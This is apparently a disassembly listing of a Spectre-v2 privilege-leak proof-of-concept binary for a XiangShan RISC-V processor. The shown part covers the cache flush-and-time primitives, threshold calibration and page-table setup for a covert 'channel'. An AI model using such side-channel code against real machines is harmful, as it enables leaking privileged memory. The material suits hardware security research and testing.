
/nfs/home/leizhenyu/opt/verified_poc/xiangshan-v2/spectre-v2-privilege-kmhv2/code/build/spectre-v2-privilege-riscv64-xs.elf:     file format elf64-littleriscv


Disassembly of section .text:

0000000080000000 <_start>:
    80000000:	00000093          	li	ra,0
    80000004:	00000113          	li	sp,0
    80000008:	00000193          	li	gp,0
    8000000c:	00000213          	li	tp,0
    80000010:	00000293          	li	t0,0
    80000014:	00000313          	li	t1,0
    80000018:	00000393          	li	t2,0
    8000001c:	00000413          	li	s0,0
    80000020:	00000493          	li	s1,0
    80000024:	00000513          	li	a0,0
    80000028:	00000593          	li	a1,0
    8000002c:	00000613          	li	a2,0
    80000030:	00000693          	li	a3,0
    80000034:	00000713          	li	a4,0
    80000038:	00000793          	li	a5,0
    8000003c:	00000813          	li	a6,0
    80000040:	00000893          	li	a7,0
    80000044:	00000913          	li	s2,0
    80000048:	00000993          	li	s3,0
    8000004c:	00000a13          	li	s4,0
    80000050:	00000a93          	li	s5,0
    80000054:	00000b13          	li	s6,0
    80000058:	00000b93          	li	s7,0
    8000005c:	00000c13          	li	s8,0
    80000060:	00000c93          	li	s9,0
    80000064:	00000d13          	li	s10,0
    80000068:	00000d93          	li	s11,0
    8000006c:	00000e13          	li	t3,0
    80000070:	00000e93          	li	t4,0
    80000074:	00000f13          	li	t5,0
    80000078:	00000f93          	li	t6,0
    8000007c:	6509                	lui	a0,0x2
    8000007e:	30052073          	csrs	mstatus,a0
    80000082:	00305073          	csrwi	fcsr,0
    80000086:	f0000053          	fmv.w.x	ft0,zero
    8000008a:	f00000d3          	fmv.w.x	ft1,zero
    8000008e:	f0000153          	fmv.w.x	ft2,zero
    80000092:	f00001d3          	fmv.w.x	ft3,zero
    80000096:	f0000253          	fmv.w.x	ft4,zero
    8000009a:	f00002d3          	fmv.w.x	ft5,zero
    8000009e:	f0000353          	fmv.w.x	ft6,zero
    800000a2:	f00003d3          	fmv.w.x	ft7,zero
    800000a6:	f0000453          	fmv.w.x	fs0,zero
    800000aa:	f00004d3          	fmv.w.x	fs1,zero
    800000ae:	f0000553          	fmv.w.x	fa0,zero
    800000b2:	f00005d3          	fmv.w.x	fa1,zero
    800000b6:	f0000653          	fmv.w.x	fa2,zero
    800000ba:	f00006d3          	fmv.w.x	fa3,zero
    800000be:	f0000753          	fmv.w.x	fa4,zero
    800000c2:	f00007d3          	fmv.w.x	fa5,zero
    800000c6:	f0000853          	fmv.w.x	fa6,zero
    800000ca:	f00008d3          	fmv.w.x	fa7,zero
    800000ce:	f0000953          	fmv.w.x	fs2,zero
    800000d2:	f00009d3          	fmv.w.x	fs3,zero
    800000d6:	f0000a53          	fmv.w.x	fs4,zero
    800000da:	f0000ad3          	fmv.w.x	fs5,zero
    800000de:	f0000b53          	fmv.w.x	fs6,zero
    800000e2:	f0000bd3          	fmv.w.x	fs7,zero
    800000e6:	f0000c53          	fmv.w.x	fs8,zero
    800000ea:	f0000cd3          	fmv.w.x	fs9,zero
    800000ee:	f0000d53          	fmv.w.x	fs10,zero
    800000f2:	f0000dd3          	fmv.w.x	fs11,zero
    800000f6:	f0000e53          	fmv.w.x	ft8,zero
    800000fa:	f0000ed3          	fmv.w.x	ft9,zero
    800000fe:	f0000f53          	fmv.w.x	ft10,zero
    80000102:	f0000fd3          	fmv.w.x	ft11,zero
    80000106:	00042297          	auipc	t0,0x42
    8000010a:	efa28293          	addi	t0,t0,-262 # 80042000 <_stack_top>
    8000010e:	0004a317          	auipc	t1,0x4a
    80000112:	ef230313          	addi	t1,t1,-270 # 8004a000 <_stack_pointer>
    80000116:	40530e33          	sub	t3,t1,t0
    8000011a:	f1402ef3          	csrr	t4,mhartid
    8000011e:	03de0f33          	mul	t5,t3,t4
    80000122:	006f0133          	add	sp,t5,t1
    80000126:	73e030ef          	jal	80003864 <_trm_init>
	...

0000000080000140 <putstr>:
    80000140:	1101                	addi	sp,sp,-32
    80000142:	ec06                	sd	ra,24(sp)
    80000144:	e822                	sd	s0,16(sp)
    80000146:	1000                	addi	s0,sp,32
    80000148:	fea43423          	sd	a0,-24(s0)
    8000014c:	a821                	j	80000164 <putstr+0x24>
    8000014e:	fe843783          	ld	a5,-24(s0)
    80000152:	00178713          	addi	a4,a5,1
    80000156:	fee43423          	sd	a4,-24(s0)
    8000015a:	0007c783          	lbu	a5,0(a5)
    8000015e:	853e                	mv	a0,a5
    80000160:	6b4030ef          	jal	80003814 <_putc>
    80000164:	fe843783          	ld	a5,-24(s0)
    80000168:	0007c783          	lbu	a5,0(a5)
    8000016c:	f3ed                	bnez	a5,8000014e <putstr+0xe>
    8000016e:	0001                	nop
    80000170:	0001                	nop
    80000172:	60e2                	ld	ra,24(sp)
    80000174:	6442                	ld	s0,16(sp)
    80000176:	6105                	addi	sp,sp,32
    80000178:	8082                	ret

000000008000017a <rdcycle>:
    8000017a:	1101                	addi	sp,sp,-32
    8000017c:	ec22                	sd	s0,24(sp)
    8000017e:	1000                	addi	s0,sp,32
    80000180:	c00027f3          	rdcycle	a5
    80000184:	fef43423          	sd	a5,-24(s0)
    80000188:	fe843783          	ld	a5,-24(s0)
    8000018c:	853e                	mv	a0,a5
    8000018e:	6462                	ld	s0,24(sp)
    80000190:	6105                	addi	sp,sp,32
    80000192:	8082                	ret

0000000080000194 <xs_fence>:
    80000194:	1141                	addi	sp,sp,-16
    80000196:	e422                	sd	s0,8(sp)
    80000198:	0800                	addi	s0,sp,16
    8000019a:	0330000f          	fence	rw,rw
    8000019e:	0001                	nop
    800001a0:	6422                	ld	s0,8(sp)
    800001a2:	0141                	addi	sp,sp,16
    800001a4:	8082                	ret

00000000800001a6 <xs_flush_cache_line>:
    800001a6:	1101                	addi	sp,sp,-32
    800001a8:	ec22                	sd	s0,24(sp)
    800001aa:	1000                	addi	s0,sp,32
    800001ac:	fea43423          	sd	a0,-24(s0)
    800001b0:	fe843783          	ld	a5,-24(s0)
    800001b4:	0027a00f          	cbo.flush	(a5)
    800001b8:	0001                	nop
    800001ba:	6462                	ld	s0,24(sp)
    800001bc:	6105                	addi	sp,sp,32
    800001be:	8082                	ret

00000000800001c0 <xs_probe_time>:
    800001c0:	7139                	addi	sp,sp,-64
    800001c2:	fc06                	sd	ra,56(sp)
    800001c4:	f822                	sd	s0,48(sp)
    800001c6:	0080                	addi	s0,sp,64
    800001c8:	fca43423          	sd	a0,-56(s0)
    800001cc:	fc040fa3          	sb	zero,-33(s0)
    800001d0:	fc5ff0ef          	jal	80000194 <xs_fence>
    800001d4:	fa7ff0ef          	jal	8000017a <rdcycle>
    800001d8:	fea43423          	sd	a0,-24(s0)
    800001dc:	fc843783          	ld	a5,-56(s0)
    800001e0:	0007c783          	lbu	a5,0(a5)
    800001e4:	0ff7f713          	zext.b	a4,a5
    800001e8:	fdf44783          	lbu	a5,-33(s0)
    800001ec:	0ff7f793          	zext.b	a5,a5
    800001f0:	8ff9                	and	a5,a5,a4
    800001f2:	0ff7f793          	zext.b	a5,a5
    800001f6:	fcf40fa3          	sb	a5,-33(s0)
    800001fa:	f9bff0ef          	jal	80000194 <xs_fence>
    800001fe:	f7dff0ef          	jal	8000017a <rdcycle>
    80000202:	fea43023          	sd	a0,-32(s0)
    80000206:	fe043703          	ld	a4,-32(s0)
    8000020a:	fe843783          	ld	a5,-24(s0)
    8000020e:	40f707b3          	sub	a5,a4,a5
    80000212:	853e                	mv	a0,a5
    80000214:	70e2                	ld	ra,56(sp)
    80000216:	7442                	ld	s0,48(sp)
    80000218:	6121                	addi	sp,sp,64
    8000021a:	8082                	ret

000000008000021c <xs_calibrate_threshold>:
    8000021c:	715d                	addi	sp,sp,-80
    8000021e:	e486                	sd	ra,72(sp)
    80000220:	e0a2                	sd	s0,64(sp)
    80000222:	0880                	addi	s0,sp,80
    80000224:	faa43c23          	sd	a0,-72(s0)
    80000228:	fab43823          	sd	a1,-80(s0)
    8000022c:	fe043423          	sd	zero,-24(s0)
    80000230:	fe043023          	sd	zero,-32(s0)
    80000234:	fc0403a3          	sb	zero,-57(s0)
    80000238:	fc043c23          	sd	zero,-40(s0)
    8000023c:	a895                	j	800002b0 <xs_calibrate_threshold+0x94>
    8000023e:	fb843783          	ld	a5,-72(s0)
    80000242:	fcf43823          	sd	a5,-48(s0)
    80000246:	fb843703          	ld	a4,-72(s0)
    8000024a:	fb043783          	ld	a5,-80(s0)
    8000024e:	97ba                	add	a5,a5,a4
    80000250:	fcf43423          	sd	a5,-56(s0)
    80000254:	fd043783          	ld	a5,-48(s0)
    80000258:	0007c783          	lbu	a5,0(a5)
    8000025c:	0ff7f713          	zext.b	a4,a5
    80000260:	fc744783          	lbu	a5,-57(s0)
    80000264:	0ff7f793          	zext.b	a5,a5
    80000268:	8ff9                	and	a5,a5,a4
    8000026a:	0ff7f793          	zext.b	a5,a5
    8000026e:	fcf403a3          	sb	a5,-57(s0)
    80000272:	fd043503          	ld	a0,-48(s0)
    80000276:	f4bff0ef          	jal	800001c0 <xs_probe_time>
    8000027a:	872a                	mv	a4,a0
    8000027c:	fe843783          	ld	a5,-24(s0)
    80000280:	97ba                	add	a5,a5,a4
    80000282:	fef43423          	sd	a5,-24(s0)
    80000286:	fc843503          	ld	a0,-56(s0)
    8000028a:	f1dff0ef          	jal	800001a6 <xs_flush_cache_line>
    8000028e:	f07ff0ef          	jal	80000194 <xs_fence>
    80000292:	fc843503          	ld	a0,-56(s0)
    80000296:	f2bff0ef          	jal	800001c0 <xs_probe_time>
    8000029a:	872a                	mv	a4,a0
    8000029c:	fe043783          	ld	a5,-32(s0)
    800002a0:	97ba                	add	a5,a5,a4
    800002a2:	fef43023          	sd	a5,-32(s0)
    800002a6:	fd843783          	ld	a5,-40(s0)
    800002aa:	0785                	addi	a5,a5,1
    800002ac:	fcf43c23          	sd	a5,-40(s0)
    800002b0:	fd843703          	ld	a4,-40(s0)
    800002b4:	479d                	li	a5,7
    800002b6:	f8e7f4e3          	bgeu	a5,a4,8000023e <xs_calibrate_threshold+0x22>
    800002ba:	fe843783          	ld	a5,-24(s0)
    800002be:	0037d713          	srli	a4,a5,0x3
    800002c2:	fe043783          	ld	a5,-32(s0)
    800002c6:	838d                	srli	a5,a5,0x3
    800002c8:	97ba                	add	a5,a5,a4
    800002ca:	8385                	srli	a5,a5,0x1
    800002cc:	853e                	mv	a0,a5
    800002ce:	60a6                	ld	ra,72(sp)
    800002d0:	6406                	ld	s0,64(sp)
    800002d2:	6161                	addi	sp,sp,80
    800002d4:	8082                	ret

00000000800002d6 <page_down>:
    800002d6:	1101                	addi	sp,sp,-32
    800002d8:	ec22                	sd	s0,24(sp)
    800002da:	1000                	addi	s0,sp,32
    800002dc:	fea43423          	sd	a0,-24(s0)
    800002e0:	fe843703          	ld	a4,-24(s0)
    800002e4:	77fd                	lui	a5,0xfffff
    800002e6:	8ff9                	and	a5,a5,a4
    800002e8:	853e                	mv	a0,a5
    800002ea:	6462                	ld	s0,24(sp)
    800002ec:	6105                	addi	sp,sp,32
    800002ee:	8082                	ret

00000000800002f0 <page_up>:
    800002f0:	1101                	addi	sp,sp,-32
    800002f2:	ec22                	sd	s0,24(sp)
    800002f4:	1000                	addi	s0,sp,32
    800002f6:	fea43423          	sd	a0,-24(s0)
    800002fa:	fe843703          	ld	a4,-24(s0)
    800002fe:	6785                	lui	a5,0x1
    80000300:	17fd                	addi	a5,a5,-1 # fff <i+0xfdf>
    80000302:	973e                	add	a4,a4,a5
    80000304:	77fd                	lui	a5,0xfffff
    80000306:	8ff9                	and	a5,a5,a4
    80000308:	853e                	mv	a0,a5
    8000030a:	6462                	ld	s0,24(sp)
    8000030c:	6105                	addi	sp,sp,32
    8000030e:	8082                	ret

0000000080000310 <zero_page>:
    80000310:	7179                	addi	sp,sp,-48
    80000312:	f422                	sd	s0,40(sp)
    80000314:	1800                	addi	s0,sp,48
    80000316:	fca43c23          	sd	a0,-40(s0)
    8000031a:	fd843783          	ld	a5,-40(s0)
    8000031e:	fef43023          	sd	a5,-32(s0)
    80000322:	fe043423          	sd	zero,-24(s0)
    80000326:	a831                	j	80000342 <zero_page+0x32>
    80000328:	fe843783          	ld	a5,-24(s0)
    8000032c:	078e                	slli	a5,a5,0x3
    8000032e:	fe043703          	ld	a4,-32(s0)
    80000332:	97ba                	add	a5,a5,a4
    80000334:	0007b023          	sd	zero,0(a5) # fffffffffffff000 <_pmem_end+0xffffffff3ffff000>
    80000338:	fe843783          	ld	a5,-24(s0)
    8000033c:	0785                	addi	a5,a5,1
    8000033e:	fef43423          	sd	a5,-24(s0)
    80000342:	fe843703          	ld	a4,-24(s0)
    80000346:	1ff00793          	li	a5,511
    8000034a:	fce7ffe3          	bgeu	a5,a4,80000328 <zero_page+0x18>
    8000034e:	0001                	nop
    80000350:	0001                	nop
    80000352:	7422                	ld	s0,40(sp)
    80000354:	6145                	addi	sp,sp,48
    80000356:	8082                	ret

0000000080000358 <alloc_l1>:
    80000358:	1141                	addi	sp,sp,-16
    8000035a:	e406                	sd	ra,8(sp)
    8000035c:	e022                	sd	s0,0(sp)
    8000035e:	0800                	addi	s0,sp,16
    80000360:	00041797          	auipc	a5,0x41
    80000364:	ca078793          	addi	a5,a5,-864 # 80041000 <l1_used>
    80000368:	6398                	ld	a4,0(a5)
    8000036a:	478d                	li	a5,3
    8000036c:	00e7f463          	bgeu	a5,a4,80000374 <alloc_l1+0x1c>
    80000370:	57fd                	li	a5,-1
    80000372:	a82d                	j	800003ac <alloc_l1+0x54>
    80000374:	00041797          	auipc	a5,0x41
    80000378:	c8c78793          	addi	a5,a5,-884 # 80041000 <l1_used>
    8000037c:	639c                	ld	a5,0(a5)
    8000037e:	00c79713          	slli	a4,a5,0xc
    80000382:	0001d797          	auipc	a5,0x1d
    80000386:	c7e78793          	addi	a5,a5,-898 # 8001d000 <l1_pts>
    8000038a:	97ba                	add	a5,a5,a4
    8000038c:	853e                	mv	a0,a5
    8000038e:	f83ff0ef          	jal	80000310 <zero_page>
    80000392:	00041797          	auipc	a5,0x41
    80000396:	c6e78793          	addi	a5,a5,-914 # 80041000 <l1_used>
    8000039a:	639c                	ld	a5,0(a5)
    8000039c:	00178693          	addi	a3,a5,1
    800003a0:	00041717          	auipc	a4,0x41
    800003a4:	c6070713          	addi	a4,a4,-928 # 80041000 <l1_used>
    800003a8:	e314                	sd	a3,0(a4)
    800003aa:	2781                	sext.w	a5,a5
    800003ac:	853e                	mv	a0,a5
    800003ae:	60a2                	ld	ra,8(sp)
    800003b0:	6402                	ld	s0,0(sp)
    800003b2:	0141                	addi	sp,sp,16
    800003b4:	8082                	ret

00000000800003b6 <alloc_l0>:
    800003b6:	1141                	addi	sp,sp,-16
    800003b8:	e406                	sd	ra,8(sp)
    800003ba:	e022                	sd	s0,0(sp)
    800003bc:	0800                	addi	s0,sp,16
    800003be:	00041797          	auipc	a5,0x41
    800003c2:	c4a78793          	addi	a5,a5,-950 # 80041008 <l0_used>
    800003c6:	6398                	ld	a4,0(a5)
    800003c8:	47fd                	li	a5,31
    800003ca:	00e7f463          	bgeu	a5,a4,800003d2 <alloc_l0+0x1c>
    800003ce:	57fd                	li	a5,-1
    800003d0:	a82d                	j	8000040a <alloc_l0+0x54>
    800003d2:	00041797          	auipc	a5,0x41
    800003d6:	c3678793          	addi	a5,a5,-970 # 80041008 <l0_used>
    800003da:	639c                	ld	a5,0(a5)
    800003dc:	00c79713          	slli	a4,a5,0xc
    800003e0:	00021797          	auipc	a5,0x21
    800003e4:	c2078793          	addi	a5,a5,-992 # 80021000 <l0_pts>
    800003e8:	97ba                	add	a5,a5,a4
    800003ea:	853e                	mv	a0,a5
    800003ec:	f25ff0ef          	jal	80000310 <zero_page>
    800003f0:	00041797          	auipc	a5,0x41
    800003f4:	c1878793          	addi	a5,a5,-1000 # 80041008 <l0_used>
    800003f8:	639c                	ld	a5,0(a5)
    800003fa:	00178693          	addi	a3,a5,1
    800003fe:	00041717          	auipc	a4,0x41
    80000402:	c0a70713          	addi	a4,a4,-1014 # 80041008 <l0_used>
    80000406:	e314                	sd	a3,0(a4)
    80000408:	2781                	sext.w	a5,a5
    8000040a:	853e                	mv	a0,a5
    8000040c:	60a2                	ld	ra,8(sp)
    8000040e:	6402                	ld	s0,0(sp)
    80000410:	0141                	addi	sp,sp,16
    80000412:	8082                	ret

0000000080000414 <walk_page>:
    80000414:	715d                	addi	sp,sp,-80
    80000416:	e486                	sd	ra,72(sp)
    80000418:	e0a2                	sd	s0,64(sp)
    8000041a:	0880                	addi	s0,sp,80
    8000041c:	faa43c23          	sd	a0,-72(s0)
    80000420:	87ae                	mv	a5,a1
    80000422:	faf42a23          	sw	a5,-76(s0)
    80000426:	fb843783          	ld	a5,-72(s0)
    8000042a:	83f9                	srli	a5,a5,0x1e
    8000042c:	1ff7f793          	andi	a5,a5,511
    80000430:	fef43423          	sd	a5,-24(s0)
    80000434:	fb843783          	ld	a5,-72(s0)
    80000438:	83d5                	srli	a5,a5,0x15
    8000043a:	1ff7f793          	andi	a5,a5,511
    8000043e:	fef43023          	sd	a5,-32(s0)
    80000442:	fb843783          	ld	a5,-72(s0)
    80000446:	83b1                	srli	a5,a5,0xc
    80000448:	1ff7f793          	andi	a5,a5,511
    8000044c:	fcf43c23          	sd	a5,-40(s0)
    80000450:	0001c717          	auipc	a4,0x1c
    80000454:	bb070713          	addi	a4,a4,-1104 # 8001c000 <root_pt>
    80000458:	fe843783          	ld	a5,-24(s0)
    8000045c:	078e                	slli	a5,a5,0x3
    8000045e:	97ba                	add	a5,a5,a4
    80000460:	639c                	ld	a5,0(a5)
    80000462:	8b85                	andi	a5,a5,1
    80000464:	eba9                	bnez	a5,800004b6 <walk_page+0xa2>
    80000466:	fb442783          	lw	a5,-76(s0)
    8000046a:	2781                	sext.w	a5,a5
    8000046c:	e399                	bnez	a5,80000472 <walk_page+0x5e>
    8000046e:	4781                	li	a5,0
    80000470:	a0cd                	j	80000552 <walk_page+0x13e>
    80000472:	ee7ff0ef          	jal	80000358 <alloc_l1>
    80000476:	87aa                	mv	a5,a0
    80000478:	fcf42a23          	sw	a5,-44(s0)
    8000047c:	fd442783          	lw	a5,-44(s0)
    80000480:	2781                	sext.w	a5,a5
    80000482:	0007d463          	bgez	a5,8000048a <walk_page+0x76>
    80000486:	4781                	li	a5,0
    80000488:	a0e9                	j	80000552 <walk_page+0x13e>
    8000048a:	fd442783          	lw	a5,-44(s0)
    8000048e:	00c79713          	slli	a4,a5,0xc
    80000492:	0001d797          	auipc	a5,0x1d
    80000496:	b6e78793          	addi	a5,a5,-1170 # 8001d000 <l1_pts>
    8000049a:	97ba                	add	a5,a5,a4
    8000049c:	83b1                	srli	a5,a5,0xc
    8000049e:	07aa                	slli	a5,a5,0xa
    800004a0:	0017e713          	ori	a4,a5,1
    800004a4:	0001c697          	auipc	a3,0x1c
    800004a8:	b5c68693          	addi	a3,a3,-1188 # 8001c000 <root_pt>
    800004ac:	fe843783          	ld	a5,-24(s0)
    800004b0:	078e                	slli	a5,a5,0x3
    800004b2:	97b6                	add	a5,a5,a3
    800004b4:	e398                	sd	a4,0(a5)
    800004b6:	0001c717          	auipc	a4,0x1c
    800004ba:	b4a70713          	addi	a4,a4,-1206 # 8001c000 <root_pt>
    800004be:	fe843783          	ld	a5,-24(s0)
    800004c2:	078e                	slli	a5,a5,0x3
    800004c4:	97ba                	add	a5,a5,a4
    800004c6:	639c                	ld	a5,0(a5)
    800004c8:	83a9                	srli	a5,a5,0xa
    800004ca:	07b2                	slli	a5,a5,0xc
    800004cc:	fcf43423          	sd	a5,-56(s0)
    800004d0:	fe043783          	ld	a5,-32(s0)
    800004d4:	078e                	slli	a5,a5,0x3
    800004d6:	fc843703          	ld	a4,-56(s0)
    800004da:	97ba                	add	a5,a5,a4
    800004dc:	639c                	ld	a5,0(a5)
    800004de:	8b85                	andi	a5,a5,1
    800004e0:	eba1                	bnez	a5,80000530 <walk_page+0x11c>
    800004e2:	fb442783          	lw	a5,-76(s0)
    800004e6:	2781                	sext.w	a5,a5
    800004e8:	e399                	bnez	a5,800004ee <walk_page+0xda>
    800004ea:	4781                	li	a5,0
    800004ec:	a09d                	j	80000552 <walk_page+0x13e>
    800004ee:	ec9ff0ef          	jal	800003b6 <alloc_l0>
    800004f2:	87aa                	mv	a5,a0
    800004f4:	fcf42a23          	sw	a5,-44(s0)
    800004f8:	fd442783          	lw	a5,-44(s0)
    800004fc:	2781                	sext.w	a5,a5
    800004fe:	0007d463          	bgez	a5,80000506 <walk_page+0xf2>
    80000502:	4781                	li	a5,0
    80000504:	a0b9                	j	80000552 <walk_page+0x13e>
    80000506:	fd442783          	lw	a5,-44(s0)
    8000050a:	00c79713          	slli	a4,a5,0xc
    8000050e:	00021797          	auipc	a5,0x21
    80000512:	af278793          	addi	a5,a5,-1294 # 80021000 <l0_pts>
    80000516:	97ba                	add	a5,a5,a4
    80000518:	83b1                	srli	a5,a5,0xc
    8000051a:	00a79713          	slli	a4,a5,0xa
    8000051e:	fe043783          	ld	a5,-32(s0)
    80000522:	078e                	slli	a5,a5,0x3
    80000524:	fc843683          	ld	a3,-56(s0)
    80000528:	97b6                	add	a5,a5,a3
    8000052a:	00176713          	ori	a4,a4,1
    8000052e:	e398                	sd	a4,0(a5)
    80000530:	fe043783          	ld	a5,-32(s0)
    80000534:	078e                	slli	a5,a5,0x3
    80000536:	fc843703          	ld	a4,-56(s0)
    8000053a:	97ba                	add	a5,a5,a4
    8000053c:	639c                	ld	a5,0(a5)
    8000053e:	83a9                	srli	a5,a5,0xa
    80000540:	07b2                	slli	a5,a5,0xc
    80000542:	fcf43023          	sd	a5,-64(s0)
    80000546:	fd843783          	ld	a5,-40(s0)
    8000054a:	078e                	slli	a5,a5,0x3
    8000054c:	fc043703          	ld	a4,-64(s0)
    80000550:	97ba                	add	a5,a5,a4
    80000552:	853e                	mv	a0,a5
    80000554:	60a6                	ld	ra,72(sp)
    80000556:	6406                	ld	s0,64(sp)
    80000558:	6161                	addi	sp,sp,80
    8000055a:	8082                	ret

000000008000055c <map_identity_page>:
    8000055c:	7179                	addi	sp,sp,-48
    8000055e:	f406                	sd	ra,40(sp)
    80000560:	f022                	sd	s0,32(sp)
    80000562:	1800                	addi	s0,sp,48
    80000564:	fca43c23          	sd	a0,-40(s0)
    80000568:	fcb43823          	sd	a1,-48(s0)
    8000056c:	4585                	li	a1,1
    8000056e:	fd843503          	ld	a0,-40(s0)
    80000572:	ea3ff0ef          	jal	80000414 <walk_page>
    80000576:	fea43423          	sd	a0,-24(s0)
    8000057a:	fe843783          	ld	a5,-24(s0)
    8000057e:	e399                	bnez	a5,80000584 <map_identity_page+0x28>
    80000580:	57fd                	li	a5,-1
    80000582:	a02d                	j	800005ac <map_identity_page+0x50>
    80000584:	fd843783          	ld	a5,-40(s0)
    80000588:	83b1                	srli	a5,a5,0xc
    8000058a:	00a79713          	slli	a4,a5,0xa
    8000058e:	fd043783          	ld	a5,-48(s0)
    80000592:	8f5d                	or	a4,a4,a5
    80000594:	fd043783          	ld	a5,-48(s0)
    80000598:	0796                	slli	a5,a5,0x5
    8000059a:	0807f793          	andi	a5,a5,128
    8000059e:	8fd9                	or	a5,a5,a4
    800005a0:	0417e713          	ori	a4,a5,65
    800005a4:	fe843783          	ld	a5,-24(s0)
    800005a8:	e398                	sd	a4,0(a5)
    800005aa:	4781                	li	a5,0
    800005ac:	853e                	mv	a0,a5
    800005ae:	70a2                	ld	ra,40(sp)
    800005b0:	7402                	ld	s0,32(sp)
    800005b2:	6145                	addi	sp,sp,48
    800005b4:	8082                	ret

00000000800005b6 <map_identity_range>:
    800005b6:	7139                	addi	sp,sp,-64
    800005b8:	fc06                	sd	ra,56(sp)
    800005ba:	f822                	sd	s0,48(sp)
    800005bc:	0080                	addi	s0,sp,64
    800005be:	fca43c23          	sd	a0,-40(s0)
    800005c2:	fcb43823          	sd	a1,-48(s0)
    800005c6:	fcc43423          	sd	a2,-56(s0)
    800005ca:	fd843503          	ld	a0,-40(s0)
    800005ce:	d09ff0ef          	jal	800002d6 <page_down>
    800005d2:	fea43423          	sd	a0,-24(s0)
    800005d6:	fd043503          	ld	a0,-48(s0)
    800005da:	d17ff0ef          	jal	800002f0 <page_up>
    800005de:	fea43023          	sd	a0,-32(s0)
    800005e2:	a00d                	j	80000604 <map_identity_range+0x4e>
    800005e4:	fc843583          	ld	a1,-56(s0)
    800005e8:	fe843503          	ld	a0,-24(s0)
    800005ec:	f71ff0ef          	jal	8000055c <map_identity_page>
    800005f0:	87aa                	mv	a5,a0
    800005f2:	c399                	beqz	a5,800005f8 <map_identity_range+0x42>
    800005f4:	57fd                	li	a5,-1
    800005f6:	a831                	j	80000612 <map_identity_range+0x5c>
    800005f8:	fe843703          	ld	a4,-24(s0)
    800005fc:	6785                	lui	a5,0x1
    800005fe:	97ba                	add	a5,a5,a4
    80000600:	fef43423          	sd	a5,-24(s0)
    80000604:	fe843703          	ld	a4,-24(s0)
    80000608:	fe043783          	ld	a5,-32(s0)
    8000060c:	fcf76ce3          	bltu	a4,a5,800005e4 <map_identity_range+0x2e>
    80000610:	4781                	li	a5,0
    80000612:	853e                	mv	a0,a5
    80000614:	70e2                	ld	ra,56(sp)
    80000616:	7442                	ld	s0,48(sp)
    80000618:	6121                	addi	sp,sp,64
    8000061a:	8082                	ret

000000008000061c <install_priv_page_table>:
    8000061c:	1101                	addi	sp,sp,-32
    8000061e:	ec06                	sd	ra,24(sp)
    80000620:	e822                	sd	s0,16(sp)
    80000622:	1000                	addi	s0,sp,32
    80000624:	0001c517          	auipc	a0,0x1c
    80000628:	9dc50513          	addi	a0,a0,-1572 # 8001c000 <root_pt>
    8000062c:	ce5ff0ef          	jal	80000310 <zero_page>
    80000630:	00041797          	auipc	a5,0x41
    80000634:	9d078793          	addi	a5,a5,-1584 # 80041000 <l1_used>
    80000638:	0007b023          	sd	zero,0(a5)
    8000063c:	00041797          	auipc	a5,0x41
    80000640:	9cc78793          	addi	a5,a5,-1588 # 80041008 <l0_used>
    80000644:	0007b023          	sd	zero,0(a5)
    80000648:	00002797          	auipc	a5,0x2
    8000064c:	9b878793          	addi	a5,a5,-1608 # 80002000 <is_candidate_value>
    80000650:	00003717          	auipc	a4,0x3
    80000654:	9b070713          	addi	a4,a4,-1616 # 80003000 <__u_text_end>
    80000658:	4669                	li	a2,26
    8000065a:	85ba                	mv	a1,a4
    8000065c:	853e                	mv	a0,a5
    8000065e:	f59ff0ef          	jal	800005b6 <map_identity_range>
    80000662:	87aa                	mv	a5,a0
    80000664:	c795                	beqz	a5,80000690 <install_priv_page_table+0x74>
    80000666:	00005517          	auipc	a0,0x5
    8000066a:	70250513          	addi	a0,a0,1794 # 80005d68 <printf_+0x62>
    8000066e:	ad3ff0ef          	jal	80000140 <putstr>
    80000672:	00005517          	auipc	a0,0x5
    80000676:	70650513          	addi	a0,a0,1798 # 80005d78 <printf_+0x72>
    8000067a:	ac7ff0ef          	jal	80000140 <putstr>
    8000067e:	00005517          	auipc	a0,0x5
    80000682:	71250513          	addi	a0,a0,1810 # 80005d90 <printf_+0x8a>
    80000686:	abbff0ef          	jal	80000140 <putstr>
    8000068a:	4505                	li	a0,1
    8000068c:	1aa030ef          	jal	80003836 <_halt>
    80000690:	00008697          	auipc	a3,0x8
    80000694:	97068693          	addi	a3,a3,-1680 # 80008000 <channel>
    80000698:	00008717          	auipc	a4,0x8
    8000069c:	96870713          	addi	a4,a4,-1688 # 80008000 <channel>
    800006a0:	6791                	lui	a5,0x4
    800006a2:	97ba                	add	a5,a5,a4
    800006a4:	4659                	li	a2,22
    800006a6:	85be                	mv	a1,a5
    800006a8:	8536                	mv	a0,a3
    800006aa:	f0dff0ef          	jal	800005b6 <map_identity_range>
    800006ae:	87aa                	mv	a5,a0
    800006b0:	c795                	beqz	a5,800006dc <install_priv_page_table+0xc0>
    800006b2:	00005517          	auipc	a0,0x5
    800006b6:	6b650513          	addi	a0,a0,1718 # 80005d68 <printf_+0x62>
    800006ba:	a87ff0ef          	jal	80000140 <putstr>
    800006be:	00005517          	auipc	a0,0x5
    800006c2:	74250513          	addi	a0,a0,1858 # 80005e00 <printf_+0xfa>
    800006c6:	a7bff0ef          	jal	80000140 <putstr>
    800006ca:	00005517          	auipc	a0,0x5
    800006ce:	74e50513          	addi	a0,a0,1870 # 80005e18 <printf_+0x112>
    800006d2:	a6fff0ef          	jal	80000140 <putstr>
    800006d6:	4505                	li	a0,1
    800006d8:	15e030ef          	jal	80003836 <_halt>
    800006dc:	0000c697          	auipc	a3,0xc
    800006e0:	92468693          	addi	a3,a3,-1756 # 8000c000 <u_stack>
    800006e4:	0000c717          	auipc	a4,0xc
    800006e8:	91c70713          	addi	a4,a4,-1764 # 8000c000 <u_stack>
    800006ec:	6791                	lui	a5,0x4
    800006ee:	97ba                	add	a5,a5,a4
    800006f0:	4659                	li	a2,22
    800006f2:	85be                	mv	a1,a5
    800006f4:	8536                	mv	a0,a3
    800006f6:	ec1ff0ef          	jal	800005b6 <map_identity_range>
    800006fa:	87aa                	mv	a5,a0
    800006fc:	c795                	beqz	a5,80000728 <install_priv_page_table+0x10c>
    800006fe:	00005517          	auipc	a0,0x5
    80000702:	66a50513          	addi	a0,a0,1642 # 80005d68 <printf_+0x62>
    80000706:	a3bff0ef          	jal	80000140 <putstr>
    8000070a:	00005517          	auipc	a0,0x5
    8000070e:	77e50513          	addi	a0,a0,1918 # 80005e88 <printf_+0x182>
    80000712:	a2fff0ef          	jal	80000140 <putstr>
    80000716:	00005517          	auipc	a0,0x5
    8000071a:	78a50513          	addi	a0,a0,1930 # 80005ea0 <printf_+0x19a>
    8000071e:	a23ff0ef          	jal	80000140 <putstr>
    80000722:	4505                	li	a0,1
    80000724:	112030ef          	jal	80003836 <_halt>
